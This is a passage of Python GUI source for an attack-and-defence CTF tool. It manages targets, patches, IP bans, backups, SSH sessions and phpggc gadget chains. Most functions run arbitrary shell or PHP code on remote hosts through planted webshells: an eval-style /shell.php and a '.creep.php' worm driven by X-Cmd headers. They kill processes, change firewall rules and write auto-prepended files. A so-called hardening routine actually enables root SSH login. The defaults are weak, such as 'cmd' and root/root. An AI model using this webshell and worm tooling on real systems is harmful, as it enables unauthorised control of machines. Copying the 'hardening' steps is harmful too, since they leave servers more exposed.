            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(s.findings)} 个发现', foreground='#00ff9d'))
        async_run(run)

    def af_refresh_tree(self):
        for item in self.af_tree.get_children():
            self.af_tree.delete(item)
        for f in self._af_findings:
            sev = f['severity']
            tag = sev if sev in ('critical', 'high', 'medium', 'low') else 'medium'
            self.af_tree.insert('', 'end', values=(sev.upper(), f['name'], f.get('remote_file', f.get('file', '?')), f['line'], f['match'][:80]), tags=(tag,))

    def af_deploy_patch(self):
        if not self._af_findings:
            messagebox.showwarning('', '请先扫描漏洞')
            return
        ips = parse_targets(self.af_ip.get().strip())
        if not ips:
            messagebox.showwarning('', '请输入目标IP')
            return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        shell_url = self.af_shell.get().strip() or '/shell.php'
        shell_pass = self.af_pass.get().strip() or 'cmd'
        https = self.af_https.get()
        ip = ips[0]
        sev_count = sum((1 for f in self._af_findings if f['severity'] in ('critical', 'high')))
        msg = f'发现 {len(self._af_findings)} 个漏洞(高危{sev_count}个)\n部署自动补丁到 {ip}？'
        if not messagebox.askyesno('确认部署', msg):
            return
        self.af_log_msg(f'>>> 生成补丁...', 'warn')
        async_run(lambda: self._af_deploy(ip, port, shell_url, shell_pass, https, timeout))

    def _af_deploy(self, ip, port, shell_url, shell_pass, https, timeout):
        try:
            _try_add_path(os.path.join(BASE, '防御模块'))
            from patch_deploy import PatchGenerator, PatchDeployer
            pg = PatchGenerator()
            patches = pg.generate_patches(self._af_findings)
            self.af_log_msg(f'生成 {len(patches)} 个补丁方案', 'info')
            waf_code = pg.generate_waf_patch(patches)
            pd = PatchDeployer()
            if waf_code:
                ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, waf_code, '/var/www/html/.yl_patch.php', https, timeout)
                self.af_log_msg(f"WAF补丁部署: {('✓' if ok else '✗')}", 'ok' if ok else 'fail')
            user_ini = 'auto_prepend_file = /var/www/html/.yl_patch.php\n'
            ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, user_ini, '/var/www/html/.user.ini', https, timeout)
            self.af_log_msg(f"自动加载部署: {('✓' if ok else '✗')}", 'ok' if ok else 'fail')
            for p in patches:
                self.af_log_msg(f"  [{p['severity'].upper()}] {p['name']} ({p['count']}处)", 'info')
                self.af_log_msg(f"    快速修复: {p['fix_fast']}", 'out')
                self.af_log_msg(f"    安全修复: {p['fix_secure']}", 'out')
            self.af_log_msg('>>> 自动修复完成', 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text='补丁已部署', foreground='#00ff9d'))
        except Exception as e:
            self.af_log_msg(f'部署失败: {e}', 'fail')

    def _ban_cmd(self, action, target_ip, ips):
        """action: 'add'/'del'。经蠕虫执行 PHP CLI 管理 .waf.dat 黑名单(K), 应用层封禁(真生效)"""
        if not ips or not target_ip:
            return None
        port = safe_int(self._get_ep_port(), 80)
        find_cmd = 'find /var/www/html /app/web /var/www /web /www -name waf_ban.php -print -quit 2>/dev/null'
        try:
            base_f = make_base(target_ip, port, False)
            r_find = _session().post(f'{base_f}/.creep.php', headers={'X-Creep': cfg.get('password', 'cmd'), 'X-Cmd': find_cmd}, timeout=8)
            ban_path = (r_find.text or '').strip() or '/var/www/html/waf_ban.php'
        except Exception:
            ban_path = '/var/www/html/waf_ban.php'
        cmd = '; '.join([f'php {ban_path} {action} {ip}' for ip in ips])
        try:
            base = make_base(target_ip, port, False)
            r = _session().post(f'{base}/.creep.php', headers={'X-Creep': cfg.get('password', 'cmd'), 'X-Cmd': cmd}, timeout=15)
            txt = r.text or ''
            return 'OK:' in txt and 'NO_DAT' not in txt and ('BAD' not in txt)
        except Exception:
            return False

    def _get_ep_port(self):
        try:
            if hasattr(self, 'ban_port') and self.ban_port.get().strip():
                return int(self.ban_port.get().strip())
        except Exception:
            pass
        try:
            if hasattr(self, 'entry_port') and self.entry_port.get().strip():
                return int(self.entry_port.get().strip() or 80)
        except Exception:
            pass
        try:
            if hasattr(self, 'af_port'):
                return int(self.af_port.get() or 80)
        except Exception:
            pass
        return 80

    def do_ipban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target:
            messagebox.showwarning('', '请填写目标靶机和封禁IP')
            return
        ok = self._ban_cmd('add', ip, [target])
        self.ban_lw.log(f"[{('OK' if ok else 'FAIL')}] 封禁 {target} (应用层, {ip})", 'ok' if ok else 'fail')

    def do_ipunban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target:
            return
        ok = self._ban_cmd('del', ip, [target])
        self.ban_lw.log(f"[{('OK' if ok else 'FAIL')}] 解封 {target} ({ip})", 'ok' if ok else 'fail')

    def do_ipban_list(self):
        ip = self.ban_ip_entry.get().strip()
        if not ip:
            return
        try:
            base = make_base(ip, self._get_ep_port(), False)
            r = _session().post(f'{base}/.creep.php', headers={'X-Creep': 'cmd', 'X-Cmd': 'php /var/www/html/waf_ban.php list'}, timeout=10)
            self.ban_lw.log(f'[{ip}] 黑名单列表: {r.text.strip()[:1500]}', 'out')
        except Exception as e:
            self.ban_lw.log(f'[FAIL] {e}', 'fail')

    def do_ipban_batch(self):
        fpath = self.ban_file.get().strip()
        ip = self.ban_ip_entry.get().strip()
        if not fpath or not os.path.exists(fpath) or (not ip):
            messagebox.showwarning('', '请填写目标IP并选择IP文件')
            return
        try:
            with open(fpath) as f:
                ips = [l.strip() for l in f if l.strip() and (not l.startswith('#'))]
            ok = self._ban_cmd('add', ip, ips)
            self.ban_lw.log(f"[{('OK' if ok else 'FAIL')}] 批量封禁 {len(ips)} 个IP", 'ok' if ok else 'fail')
        except Exception as e:
            self.ban_lw.log(f'[FAIL] {e}', 'fail')

    def _switch_sb_mode(self):
        mode = self.sb_mode.get()
        if mode == 'ssh':
            self.sb_local.pack_forget()
            self.sb_ssh.pack(fill=tk.X)
        else:
            self.sb_ssh.pack_forget()
            self.sb_local.pack(fill=tk.X)

    def _open_sb_dir(self):
        d = self.sb_bakdir.get().strip() or self._bak_dir()
        try:
            os.makedirs(d, exist_ok=True)
            os.startfile(d)
        except Exception as e:
            messagebox.showerror('错误', f'无法打开备份目录: {e}')

    def toggle_sched_backup(self):
        if self.sb_running:
            self.sb_running = False
            self._sb_stop.set()
            self.btn_sb_start.config(text='▶ 开始定时备份')
            self.sb_lbl.config(text='⏸ 已停止', foreground='#6b7f9e')
            return
        mode = self.sb_mode.get()
        wd = self.sb_webdir.get().strip() if mode == 'ssh' else self.sb_local_dir.get().strip()
        if not wd:
            messagebox.showwarning('', '请填写要备份的目录')
            return
        if mode == 'ssh' and (not self.sb_ssh_host.get().strip()):
            messagebox.showwarning('', '请填写SSH主机')
            return
        try:
            interval = int(self.sb_interval.get().strip() or 10)
            if not 1 <= interval <= 10080:
                raise ValueError()
        except ValueError:
            messagebox.showerror('错误', '备份间隔应为 1～10080 分钟的整数')
            return
        self._sb_stop = stopper = threading.Event()
        self.sb_running = True
        self.btn_sb_start.config(text='⏹ 停止')
        self.sb_lbl.config(text=f'⏳ 每{interval}分钟', foreground='#00ff9d')
        bd = self.sb_bakdir.get().strip() or self._bak_dir()
        cfg = {'mode': mode, 'webdir': wd, 'bakdir': bd, 'host': self.sb_ssh_host.get().strip(), 'sport': self.sb_ssh_port.get().strip() or '2202', 'suser': self.sb_ssh_user.get().strip() or 'ctf', 'spass': self.sb_ssh_pass.get().strip()}

        def run():
            import tarfile
            try:
                os.makedirs(bd, exist_ok=True)
            except Exception:
                pass
            last_ok = None
            while not stopper.is_set():
                try:
                    fname = f"auto_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
                    fpath = os.path.join(bd, fname)
                    if cfg['mode'] == 'ssh':
                        import paramiko
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(cfg['host'], int(cfg['sport']), cfg['suser'], cfg['spass'], timeout=15, allow_agent=False, look_for_keys=False)
                        import ntpath
                        parent_dir = ntpath.dirname(cfg['webdir'].rstrip('/')) or '/var/www'
                        dir_name = ntpath.basename(cfg['webdir'].rstrip('/')) or 'html'
                        stdin, stdout, stderr = ssh.exec_command(f'tar czf - -C {parent_dir} {dir_name} 2>/dev/null', timeout=60)
                        data = stdout.read()
                        ssh.close()
                        if not data:
                            raise RuntimeError('远程tar无输出(目录可能不存在)')
                        with open(fpath, 'wb') as fh:
                            fh.write(data)
                    else:
                        with tarfile.open(fpath, 'w:gz') as tar:
                            tar.add(cfg['webdir'], arcname=os.path.basename(cfg['webdir']))
                    sz = os.path.getsize(fpath)
                    last_ok = fname
                    self.root.after(0, lambda fn=fname, s=sz: self.sb_lw.log(f'[OK] {fn} ({s / 1024:.0f}KB)', 'ok'))
                    self.root.after(0, lambda fn=fname, d=bd: self.sb_last.config(text=f'{fn} @ {d}'))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.sb_lw.log(f'[FAIL] 备份失败: {e}', 'fail'))
                stopper.wait(interval * 60)
        _GodHandThread(target=run, daemon=True).start()

    def do_discover(self, e_ip, ep, vh, et, scan_mode, e_port):
        ips = parse_targets(e_ip.get().strip())
        if not ips:
            messagebox.showwarning('警告', '请先输入IP')
            return
        mode = scan_mode.get()
        port = int(ep.get() or 80)
        timeout = int(et.get() or 5)
        lw = self._disc_log
        lw.clear()
        lw.log(f'>>> 存活探测 ({mode}) - {len(ips)} 个目标', 'info')
        TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'aigongju')

        def run():
            for ip in ips:
                try:
                    if mode == 'ping':
                        r = subprocess.run(['ping', '-n', '1', '-w', str(int(timeout * 1000)), ip], capture_output=True, timeout=timeout + 5)
                        alive = r.returncode == 0
                    elif mode == 'naabu':
                        naabu_exe = os.path.join(TOOLS_DIR, 'naabu_2.3.3_windows_amd64', 'naabu.exe')
                        if os.path.exists(naabu_exe):
                            port_str = e_port.get().strip() or '80'
                            try:
                                r = subprocess.run([naabu_exe, '-host', ip, '-p', port_str, '-silent'], capture_output=True, timeout=timeout + 10)
                                alive = ip.encode() in r.stdout
                            except Exception:
                                alive = False
                        else:
                            lw.log(f'  [SKIP] {ip}: naabu未找到', 'warn')
                            alive = False
                    else:
                        ports = [int(x.strip()) for x in e_port.get().strip().split(',') if x.strip()]
                        alive = False
                        for p in ports:
                            try:
                                s = socket.socket()
                                s.settimeout(timeout)
                                r = s.connect_ex((ip, p))
                                s.close()
                                if r == 0:
                                    alive = True
                                    break
                            except Exception:
                                pass
                    tag = 'ok' if alive else 'fail'
                    lw.log(f"  {('[ALIVE]' if alive else '[DEAD]')} {ip}", tag)
                except Exception as ex:
                    lw.log(f'  [ERR] {ip}: {ex}', 'fail')
        async_run(run)

    def do_ssh_test(self):
        ip = self.ssh_ip.get().strip()
        if not ip:
            messagebox.showwarning('提示', '请输入IP')
            return
        self.ssh_lw.log(f'>>> 测试连接 {ip}:{self.ssh_port.get()}', 'info')
        r = self._ssh_connect(ip, self.ssh_port.get(), self.ssh_user.get(), self.ssh_pass.get(), 'echo SSH_OK; id')
        self.ssh_lw.log(r[:300], 'ok' if 'SSH_OK' in r else 'fail')

    def do_ssh_chpass(self):
        ip = self.ssh_ip.get().strip()
        if not ip:
            messagebox.showwarning('提示', '请输入IP')
            return
        np = self.ssh_newpass.get().strip()
        if not np:
            messagebox.showwarning('提示', '请输入新密码')
            return
        user = self.ssh_user.get().strip()
        self.ssh_lw.log(f'>>> 修改密码 {user}@{ip}', 'info')
        cmd = f'echo "{user}:{np}" | chpasswd 2>&1; echo DONE' if user != 'root' else f'echo "root:{np}" | chpasswd 2>&1; echo DONE'
        r = self._ssh_connect(ip, self.ssh_port.get(), user, self.ssh_pass.get(), cmd)
        self.ssh_lw.log(r[:200], 'ok' if 'DONE' in r else 'fail')

    def do_ssh_cmd(self):
        ip = self.ssh_ip.get().strip()
        cmd = self.ssh_cmd.get().strip()
        if not ip or not cmd:
            return
        self.ssh_lw.log(f'>>> [{ip}] {cmd}', 'info')
        r = self._ssh_connect(ip, self.ssh_port.get(), self.ssh_user.get(), self.ssh_pass.get(), cmd)
        self.ssh_lw.log(r[:500], 'out')

    def do_ssh_batch(self):
        ips = parse_targets(self.ssh_batch_ip.get().strip())
        if not ips:
            messagebox.showwarning('提示', '请输⼊批量IP')
            return
        user = self.ssh_user.get().strip()
        pw = self.ssh_pass.get().strip()
        np = self.ssh_newpass.get().strip()
        port = int(self.ssh_port.get() or 22)
        self.ssh_lw.log(f'>>> 批量改密+加固 {len(ips)} 台', 'info')

        def run():
            for ip in ips:
                try:
                    self.ssh_lw.log(f'  [{ip}] 连接中...', 'info')
                    r1 = self._ssh_connect(ip, port, user, pw, f'echo "{user}:{np}" | chpasswd 2>&1', timeout=10)
                    self.ssh_lw.log(f"  [{ip}] 改密: {('OK' if 'DONE' in r1 or not r1.strip() else r1[:60])}", 'ok')
                    cmds = ['sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config', 'sed -i "s/PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config', 'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null', 'chmod 755 /var/www/html 2>/dev/null', 'find /var/www/html -type d -exec chmod 755 {} \\; 2>/dev/null', 'find /var/www/html -type f -exec chmod 644 {} \\; 2>/dev/null']
                    for c in cmds:
                        self._ssh_connect(ip, port, user, np, c, timeout=5)
                    self.ssh_lw.log(f'  [{ip}] 加固完成', 'ok')
                except Exception as e:
                    self.ssh_lw.log(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_ps(self, e_ip, ep, vh, et, cmd):
        ips = parse_targets(e_ip.get().strip())
        if not ips:
            return
        timeout = int(et.get() or 5)
        lw = self.ps_lw
        lw.clear()
        url = f'http://{ips[0]}:{ep.get()}' if not vh.get() else f'https://{ips[0]}:{ep.get()}'

        def go():
            for ip in ips[:3]:
                try:
                    base = make_base(ip, int(ep.get() or 80), vh.get())
                    r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=timeout)
                    lw.log(f'[{ip}]\n{r.text[:2000]}', 'out')
                except Exception as e:
                    lw.log(f'[FAIL] {ip}: {e}', 'fail')
        async_run(go)

    def do_kill_proc(self, e_ip, ep, vh, et, e_pid):
        pid = e_pid.get().strip()
        if not pid:
            return
        ips = parse_targets(e_ip.get().strip())
        if not ips:
            return
        lw = self.ps_lw
        for ip in ips[:3]:
            base = make_base(ip, int(ep.get() or 80), vh.get())
            try:
                r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': f'kill -9 {pid} 2>&1; echo OK'}, timeout=int(et.get() or 5))
                lw.log(f'[{ip}] kill {pid}: {r.text[:100]}', 'ok')
            except Exception as e:
                lw.log(f'[FAIL] {ip}: {e}', 'fail')

    def do_block_port(self, e_ip, ep, vh, et, e_block):
        port = e_block.get().strip()
        if not port:
            return
        ips = parse_targets(e_ip.get().strip())
        if not ips:
            return
        lw = self.ps_lw
        for ip in ips[:3]:
            base = make_base(ip, int(ep.get() or 80), vh.get())
            try:
                r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': f'iptables -A INPUT -p tcp --dport {port} -j DROP 2>&1; echo OK'}, timeout=int(et.get() or 5))
                lw.log(f'[{ip}] block port {port}: {r.text[:100]}', 'ok')
            except Exception as e:
                lw.log(f'[FAIL] {ip}: {e}', 'fail')

    def do_phpinfo(self):
        ip = self.pi_ip.get().strip()
        if not ip:
            messagebox.showwarning('', '请输入目标IP')
            return
        port = int(self.pi_port.get() or 80)
        path = self.pi_path.get().strip() or '/shell.php'
        pw = self.pi_pass.get().strip() or 'cmd'
        self.pi_data = []
        for i in self.pi_tree.get_children():
            self.pi_tree.delete(i)

        def run():
            try:
                base = f'http://{ip}:{port}'
                r = _session().post(f'{base}{path}', data={pw: 'phpinfo();exit;'}, timeout=10)
                if not r.text:
                    r = _session().post(f'{base}{path}', data={pw: 'echo phpversion();'}, timeout=10)
                html = r.text
                rows = re.findall('<tr><td class="e">(.*?)</td><td class="v">(.*?)</td>', html, re.DOTALL)
                if not rows:
                    rows = re.findall('<tr[^>]*><td[^>]*class="e"[^>]*>(.*?)</td><td[^>]*class="v"[^>]*>(.*?)</td>', html, re.DOTALL)
                for k, v in rows:
                    k = re.sub('<[^>]+>', '', k).strip()
                    v = re.sub('<[^>]+>', '', v).strip()
                    if k and v:
                        self.pi_data.append((k, v[:200]))
                if not self.pi_data:
                    r2 = _session().post(f'{base}{path}', data={pw: 'foreach(ini_get_all() as $k=>$v)echo "$k => {$v["local_value"]}\\n";'}, timeout=10)
                    for line in r2.text.strip().split('\n'):
                        if ' => ' in line:
                            parts = line.split(' => ', 1)
                            self.pi_data.append((parts[0].strip(), parts[1].strip()[:200]))
                self.root.after(0, self.pi_refresh)
            except Exception as e:
                self.root.after(0, lambda e=e: messagebox.showerror('错误', str(e)))
        async_run(run)

    def pi_refresh(self):
        for i in self.pi_tree.get_children():
            self.pi_tree.delete(i)
        for k, v in self.pi_data:
            self.pi_tree.insert('', tk.END, values=(k, v))

    def pi_search_text(self):
        kw = self.pi_search_var.get().strip().lower()
        for i in self.pi_tree.get_children():
            self.pi_tree.delete(i)
        for k, v in self.pi_data:
            if kw in k.lower() or kw in v.lower():
                self.pi_tree.insert('', tk.END, values=(k, v))

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.root = None
    _fields = {'running': {'kind': 'literal', 'default': False}, 'root': {'kind': 'literal', 'default': None}, 'bak_mode': {'kind': 'value', 'default': 'local'}, 'bak_webdir': {'kind': 'value', 'default': '/var/www/html'}, 'bak_ssh_host': {'kind': 'value', 'default': ''}, 'bak_ssh_port': {'kind': 'value', 'default': '22'}, 'bak_ssh_user': {'kind': 'value', 'default': 'root'}, 'bak_ssh_pass': {'kind': 'value', 'default': ''}, 'bak_ssh_dir': {'kind': 'value', 'default': '/var/www/html'}, 'scan_dir': {'kind': 'value', 'default': '/var/www/html'}, 'scan_del': {'kind': 'value', 'default': ''}, 'db_ip': {'kind': 'value', 'default': ''}, 'db_ssh_port': {'kind': 'value', 'default': '2202'}, 'db_ssh_user': {'kind': 'value', 'default': 'ctf'}, 'db_ssh_pass': {'kind': 'value', 'default': ''}, 'db_user': {'kind': 'value', 'default': 'root'}, 'db_pass': {'kind': 'value', 'default': 'root'}, 'db_name': {'kind': 'value', 'default': ''}, 'db_table': {'kind': 'value', 'default': ''}, 'db_newpass': {'kind': 'value', 'default': ''}, 'db_sql': {'kind': 'value', 'default': ''}, 'harden_custom': {'kind': 'value', 'default': ''}, 'af_ip': {'kind': 'value', 'default': ''}, 'af_port': {'kind': 'value', 'default': '80'}, 'af_https': {'kind': 'value', 'default': ''}, 'af_shell': {'kind': 'value', 'default': '/shell.php'}, 'af_pass': {'kind': 'value', 'default': 'cmd'}, 'af_to': {'kind': 'value', 'default': '10'}, 'af_tree': {'kind': 'table'}, 'af_log': {'kind': 'log'}, '_af_findings': {'kind': 'literal', 'default': []}, 'ban_ip_entry': {'kind': 'value', 'default': ''}, 'ban_port': {'kind': 'value', 'default': '8804'}, 'ban_target': {'kind': 'value', 'default': ''}, 'ban_file': {'kind': 'value', 'default': ''}, 'sb_mode': {'kind': 'value', 'default': 'ssh'}, 'sb_ssh_host': {'kind': 'value', 'default': ''}, 'sb_ssh_port': {'kind': 'value', 'default': '2202'}, 'sb_ssh_user': {'kind': 'value', 'default': 'ctf'}, 'sb_ssh_pass': {'kind': 'value', 'default': ''}, 'sb_webdir': {'kind': 'value', 'default': '/var/www/html'}, 'sb_local_dir': {'kind': 'value', 'default': ''}, 'sb_bakdir': {'kind': 'value', 'default': ''}, 'sb_running': {'kind': 'literal', 'default': False}, 'sb_interval': {'kind': 'value', 'default': '10'}, '_sb_stop': {'kind': 'event'}, 'ssh_ip': {'kind': 'value', 'default': ''}, 'ssh_port': {'kind': 'value', 'default': '22'}, 'ssh_user': {'kind': 'value', 'default': 'root'}, 'ssh_pass': {'kind': 'value', 'default': ''}, 'ssh_newpass': {'kind': 'value', 'default': ''}, 'ssh_cmd': {'kind': 'value', 'default': ''}, 'ssh_batch_ip': {'kind': 'value', 'default': ''}, 'pi_ip': {'kind': 'value', 'default': ''}, 'pi_port': {'kind': 'value', 'default': '80'}, 'pi_path': {'kind': 'value', 'default': '/shell.php'}, 'pi_pass': {'kind': 'value', 'default': 'cmd'}, 'pi_search_var': {'kind': 'value', 'default': ''}, 'pi_search': {'kind': 'value', 'default': ''}, 'pi_tree': {'kind': 'table'}, 'pi_data': {'kind': 'literal', 'default': []}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, '_godhand_ops_notebook': {'kind': 'value', 'default': ''}, 'bak_local': {'kind': 'value', 'default': ''}, 'bak_ssh': {'kind': 'value', 'default': ''}, 'btn_bak': {'kind': 'value', 'default': ''}, 'btn_restore': {'kind': 'value', 'default': ''}, 'btn_open_bak': {'kind': 'value', 'default': ''}, 'bak_dir_lbl': {'kind': 'value', 'default': ''}, 'bak_lw': {'kind': 'log'}, 'btn_scan': {'kind': 'value', 'default': ''}, 'scan_lw': {'kind': 'log'}, 'db_lw': {'kind': 'log'}, 'harden_lw': {'kind': 'log'}, '_harden_cmds': {'kind': 'value', 'default': ''}, 'af_lbl_stat': {'kind': 'value', 'default': ''}, 'ban_lw': {'kind': 'log'}, 'sb_ssh': {'kind': 'value', 'default': ''}, 'sb_local': {'kind': 'value', 'default': ''}, 'btn_sb_start': {'kind': 'value', 'default': ''}, 'sb_lbl': {'kind': 'value', 'default': ''}, 'sb_last': {'kind': 'value', 'default': ''}, 'sb_lw': {'kind': 'log'}, '_disc_log': {'kind': 'log'}, 'btn_ssh_test': {'kind': 'value', 'default': ''}, 'btn_ssh_chpass': {'kind': 'value', 'default': ''}, 'btn_ssh_cmd': {'kind': 'value', 'default': ''}, 'btn_ssh_batch': {'kind': 'value', 'default': ''}, 'ssh_lw': {'kind': 'log'}, 'ps_lw': {'kind': 'log'}, 'harden_ip': {'kind': 'value', 'default': ''}, 'harden_port': {'kind': 'value', 'default': ''}, 'harden_https': {'kind': 'value', 'default': ''}, 'harden_to': {'kind': 'value', 'default': ''}, 'bak_dir': {'kind': 'value', 'default': ''}, 'entry_port': {'kind': 'value', 'default': ''}, 'entry_creep_pass': {'kind': 'value', 'default': ''}}

class MachinesTab(ActorState):

    def refresh(self, force=True):
        try:
            if self._store:
                self.machines = self._store.machine_records(private=True)
                self._reported_store_error = False
        except Exception as exc:
            if not self._reported_store_error:
                _warn_config(f'机子列表同步失败，已保留现有记录：{exc}')
                self._reported_store_error = True
        signature = json.dumps(self.machines, ensure_ascii=False, sort_keys=True, default=str)
        if not force and signature == self._render_signature:
            return
        selected = set(self.tree.selection())
        for item in self.tree.get_children():
            self.tree.delete(item)
        for m in self.machines:
            identity = m['id']
            source = {'mcp': 'MCP 导入', 'legacy': '历史登记', 'desktop': '本机登记'}.get(m.get('source'), '机子管理')
            if m.get('conflict'):
                source += ' · 重复连接'
            if m.get('requires_local_selection'):
                source += ' · 待重选'
            self.tree.insert('', 'end', iid=identity, values=(m.get('name', ''), m.get('ip', ''), m.get('port', ''), m.get('shell', ''), '••••••' if m.get('pass') or m.get('password') else '', m.get('ssh_port', ''), m.get('ssh_user', ''), source))
        for identity in selected:
            if self.tree.exists(identity):
                self.tree.selection_add(identity)
        self._render_signature = signature

    def schedule_external_refresh(self):
        root = getattr(self.tabs_ref, 'root', None)
        if root is None:
            return

        def refresh_external():
            if getattr(self.tabs_ref, '_closing', False):
                return
            self.refresh(force=False)
            try:
                root.after(1500, refresh_external)
            except tk.TclError:
                pass
        root.after(1500, refresh_external)

    def _selected_machine(self):
        selected = self.tree.selection()
        if not selected:
            return None
        identity = selected[0]
        for machine in self.machines:
            if machine['id'] == identity:
                return machine
        return None

    def save_current(self):
        t = self.tabs_ref
        if not t:
            return
        ip = t.global_ip.get().strip()
        if not ip:
            messagebox.showwarning('提示', '请先在全局连接栏填写目标IP')
            return
        name = simpledialog.askstring('机子名称', '输入一个名字 (如 team1 / 靶机2):', parent=self.parent)
        if not name:
            return
        record = {'name': name, 'ip': ip, 'port': t.global_port.get().strip(), 'shell': t.global_shell.get().strip(), 'pass': t.global_pass.get().strip(), 'ssh_port': t.global_ssh_port.get().strip(), 'ssh_user': t.global_ssh_user.get().strip()}
        try:
            if not self._store:
                raise ValueError('加密机子存储不可用')
            result = self._store.add_target(record)['targets'][0]
            self.refresh()
            self.tree.selection_set(result['id'])
            if result['status'] == 'skipped':
                differences = '、'.join(result['differences']) or '无'
                messagebox.showinfo('连接已存在', '已选中现有记录，未覆盖任何字段。差异字段：' + differences + '。需要修改时请点“编辑选中”。')
        except Exception as exc:
            messagebox.showerror('保存失败', str(exc))

    def edit_selected(self):
        machine = self._selected_machine()
        if not machine:
            messagebox.showwarning('提示', '请先选择一台机子')
            return
        self.build_target_editor(machine)

    def load_selected(self):
        m = self._selected_machine()
        if not m:
            messagebox.showwarning('提示', '请先在列表选择一台机子')
            return
        t = self.tabs_ref
        if not t:
            return
        t.global_ip.set(m.get('ip', ''))
        t.global_port.set(m.get('port', '80'))
        t.global_shell.set(m.get('shell', '/shell.php'))
        t.global_pass.set(m.get('pass', m.get('password', '')))
        t.global_ssh_port.set(m.get('ssh_port', '2202'))
        t.global_ssh_user.set(m.get('ssh_user', 'ctf'))
        t._apply_conn()
        try:
            t.status_bar.config(text=f"✅ 已加载机子: {m.get('name')} ({m.get('ip')})")
        except Exception:
            pass

    def launch_selected_tools(self, choice):
        machine = self._selected_machine()
        if not machine:
            messagebox.showwarning('提示', '请先在列表选择一台机子')
            return
        try:
            connection = SSHConnection.from_machine(machine)
        except ValueError as exc:
            messagebox.showerror('SSH 连接信息无效', str(exc))
            return
        launchers = {'tabby': (('Tabby', launch_terminal),), 'winscp': (('WinSCP', launch_file_manager),), 'both': (('Tabby', launch_terminal), ('WinSCP', launch_file_manager))}.get(choice)
        if not launchers:
            return
        started, failed = ([], [])
        for label, launcher in launchers:
            try:
                launcher(connection, app_dir=EXE_DIR, config_dir=CONFIG_DIR)
                started.append(label)
            except ToolLaunchError as exc:
                failed.append(f'{label}: {exc}')
        if started and self.tabs_ref is not None:
            try:
                self.tabs_ref.status_bar.config(text='已提交启动请求：' + '、'.join(started) + '（连接状态请在外部程序中查看）')
            except Exception:
                pass
        if failed:
            detail = '\n'.join(failed)
            if started:
                messagebox.showwarning('部分工具启动失败', detail)
            else:
                messagebox.showerror('工具启动失败', detail)

    def delete_selected(self):
        m = self._selected_machine()
        if not m:
            return
        if messagebox.askyesno('删除', f'''确认删除机子 "{m.get('name')}"？'''):
            if not self._store:
                messagebox.showerror('删除失败', '加密机子存储不可用')
                return
            try:
                result = self._store.delete_target(m['id'])
                if result.get('warning'):
                    messagebox.showwarning('记录已删除', result['warning'])
            except Exception as exc:
                messagebox.showerror('删除失败', str(exc))
                return
            picker = getattr(self.tabs_ref, '_godhand_target_picker', None)
            if picker:
                try:
                    picker.reload()
                except Exception:
                    pass
            self.refresh()

    def _domain_init(self, parent, tabs_ref=None, store=None):
        self.parent = parent
        self.tabs_ref = tabs_ref
        self.machines = []
        self._store = store
        if self._store is None:
            try:
                from AI中枢.core import Store
                self._store = Store(root=Path(CONFIG_DIR).parent, data_dir=os.environ.get('GODHAND_DATA_DIR'))
            except Exception as exc:
                _warn_config(f'加密机子存储暂不可用：{exc}')
        self.cfg_file = str(self._store.db) if self._store else '加密存储不可用'
        self._render_signature = None
        self._reported_store_error = False
        self.refresh()
    _fields = {'machines': {'kind': 'literal', 'default': []}, '_render_signature': {'kind': 'literal', 'default': None}, '_reported_store_error': {'kind': 'literal', 'default': True}, 'tree': {'kind': 'table'}, 'parent': {'kind': 'value', 'default': ''}, 'tabs_ref': {'kind': 'value', 'default': ''}, '_store': {'kind': 'value', 'default': ''}, 'cfg_file': {'kind': 'value', 'default': ''}}

class ToolsTab(ActorState):

    def _log_widget(self, parent):
        from tkinter import scrolledtext
        st = scrolledtext.ScrolledText(parent, font=('Consolas', 9), bg='#1e1e1e', fg='#d4d4d4', insertbackground='white', height=8, state=tk.DISABLED)
        st.pack(fill=tk.BOTH, expand=True, pady=2)

        def log_msg(msg, tag='info'):
            st.config(state=tk.NORMAL)
            st.insert(tk.END, msg + '\n')
            st.see(tk.END)
            st.config(state=tk.DISABLED)
        st.log = log_msg
        return st

    def ggc_refresh(self):
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import list_chains, search_chains
            self.ggc_chains_list = list_chains(refresh=True)
            names = [c['name'] for c in self.ggc_chains_list]
            self.ggc_chain['values'] = names
            if names:
                self.ggc_chain.set(names[0])
            self.ggc_log.log(f'[+] 已加载 {len(names)} 条链')
        except Exception as e:
            self.ggc_log.log(f'[-] 加载失败: {e}')

    def ggc_search(self):
        kw = self.ggc_chain.get()
        if not kw:
            return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import search_chains
            res = search_chains(kw)
            self.ggc_chain['values'] = [c['name'] for c in res]
            if res:
                self.ggc_chain.set(res[0]['name'])
            self.ggc_log.log(f'[+] 搜索 "{kw}": 找到 {len(res)} 条')
        except Exception as e:
            self.ggc_log.log(f'[-] {e}')

    def ggc_fill(self, chain, params):
        self.ggc_chain.set(chain)
        self.ggc_params.delete(0, tk.END)
        self.ggc_params.insert(0, params)

    def ggc_generate(self):
        chain = self.ggc_chain.get()
